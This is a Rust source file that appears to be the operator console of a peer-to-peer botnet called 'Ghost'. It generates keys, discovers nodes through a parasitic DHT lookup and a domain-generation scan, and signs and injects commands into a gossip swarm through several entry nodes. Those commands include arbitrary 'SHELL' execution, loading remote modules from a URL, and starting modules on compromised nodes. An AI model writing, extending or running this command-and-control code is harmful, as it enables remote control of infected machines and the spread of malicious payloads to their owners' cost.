use std::path::PathBuf;
use crate::crypto;
use crate::network::GhostClient;


pub async fn handle_keygen(output: PathBuf) {
    if let Some(parent) = output.parent() {
        if !parent.exists() {
             let _ = std::fs::create_dir_all(parent);
        }
    }
    let pub_key = crypto::generate_key(&output);
    println!("Generated Key at: {}", output.display());
    println!("Public Key: {}", pub_key);
}

use crate::discovery::ParasiticDiscovery;
use rand::seq::SliceRandom;

pub async fn handle_list(bootstrap: Option<String>) {
    let mut client = match GhostClient::new().await {
        Ok(c) => c,
        Err(e) => { eprintln!("Failed to init GhostClient: {}", e); return; }
    };
    
    let targets = resolve_targets(bootstrap).await;
    if targets.is_empty() {
        eprintln!("No peers found via Bootstrap or DHT.");
        return;
    }
    
    println!("Attempting to list peers via: {:?}", targets);
    // For MVP, just connect to one and print success (since List logic on P2P is complex/DHT-based)
    if let Some(target) = targets.first() {
         if let Err(e) = client.dial(target).await {
             eprintln!("Dial Failed: {}", e);
         } else {
             println!("Connected to Mesh Node: {}", target);
             println!("(Peers are managed by GossipSub and DHT automatically)");
         }
    }
}

pub async fn handle_target(_bootstrap: Option<String>, _key: PathBuf, _target: String, _cmd: String) {
    println!("Direct targeting requires DHT lookup. Pending implementation.");
}

pub async fn handle_load_module(bootstrap: Option<String>, key_path: PathBuf, url: String, name: String) {
    handle_broadcast_custom(bootstrap, key_path, "LOAD_MODULE".to_string(), format!("{}|{}", url, name)).await;
}

pub async fn handle_start_module(bootstrap: Option<String>, key_path: PathBuf, name: String, args: String) {
    handle_broadcast_custom(bootstrap, key_path, "START_MODULE".to_string(), format!("{}|{}", name, args)).await;
}

pub async fn handle_broadcast(bootstrap: Option<String>, key_path: PathBuf, cmd: String) {
    println!("Broadcast Generic: {}", cmd);
    handle_broadcast_custom(bootstrap, key_path, "SHELL".to_string(), cmd).await;
}

pub async fn handle_broadcast_custom(bootstrap: Option<String>, key_path: PathBuf, action: String, params: String) {
    let key = crypto::load_key(&key_path);
    
    // 1. Resolve Targets (Bootstrap OR DHT Discovery)
    let targets = resolve_targets(bootstrap).await;
    if targets.is_empty() {
        eprintln!("No targets found. Ghost cannot inject command.");
        return;
    }

    // 2. Init P2P Client
    let mut client = match GhostClient::new().await {
        Ok(c) => c,
        Err(e) => { eprintln!("Init Error: {}", e); return; }
    };
    
    // 3. Connect to Multiple Entry Nodes (Multi-Point Injection)
    // "Hoạt động như node khác gossip" -> Connect to multiple neighbors to ensure propagation.
    let mut rng = rand::thread_rng();
    let mut shuffled = targets.clone();
    shuffled.shuffle(&mut rng);
    
    let entry_points: Vec<&String> = shuffled.iter().take(5).collect(); // Inject via up to 5 nodes
    let mut connected_count = 0;

    println!("Connecting to {} network entry points for redundancy...", entry_points.len());
    
    for entry in entry_points {
        println!("Dialing: {}", entry);
        if let Err(e) = client.dial(entry).await {
            eprintln!("  - Connection Failed to {}: {}", entry, e);
        } else {
            println!("  + Connected to {}", entry);
            connected_count += 1;
        }
    }

    if connected_count == 0 {
        eprintln!("Failed to connect to ANY entry points. Aborting injection.");
        return;
    }
    
    println!("Established {}/5 P2P Connections. Injecting Gossip...", connected_count);
    
    // 4. Create Payload
    use protocol::CommandPayload;
    let payload = CommandPayload {
        id: uuid::Uuid::new_v4().to_string(),
        action,
        parameters: params,
        execute_at: chrono::Utc::now().timestamp(), // Immediate
        reply_to: None, 
    };

    // 5. Inject
    let dummy_session = [0u8; 32]; 
    
    if let Err(e) = client.inject_command(payload, &key, &dummy_session).await {
        eprintln!("Injection Failed: {}", e);
    } else {
        println!("Command Injected into GossipSub Swarm successfully.");
    }
}

pub async fn handle_scan() {
    println!("* Initiating Financial-DGA Scan only...");
    let discovery = ParasiticDiscovery::new();
    match discovery.run_cycle(None).await {
        Ok(peers) => {
            println!("+ Discovered {} Mesh Nodes.", peers.len());
            for (i, p) in peers.iter().enumerate() {
                println!("{}. {:?}", i+1, p);
            }
        },
        Err(e) => eprintln!("- Scan Failed: {}", e),
    }
}

// Helper to resolve targets
async fn resolve_targets(bootstrap: Option<String>) -> Vec<String> {
    if let Some(b) = bootstrap {
        return vec![b];
    }
    
    println!("[Ghost] No bootstrap provided. Starting Parasitic DHT Discovery...");
    let discovery = ParasiticDiscovery::new();
    match discovery.run_cycle(None).await {
        Ok(addrs) => {
            let list: Vec<String> = addrs.iter()
                .map(|addr| format!("/ip4/{}/tcp/{}", addr.ip(), addr.port()))
                .collect();
            println!("[Ghost] Discovered {} nodes via DHT.", list.len());
            list
        },
        Err(e) => {
            eprintln!("[Ghost] DHT Discovery Failed: {}", e);
            vec![]
        }
    }
}
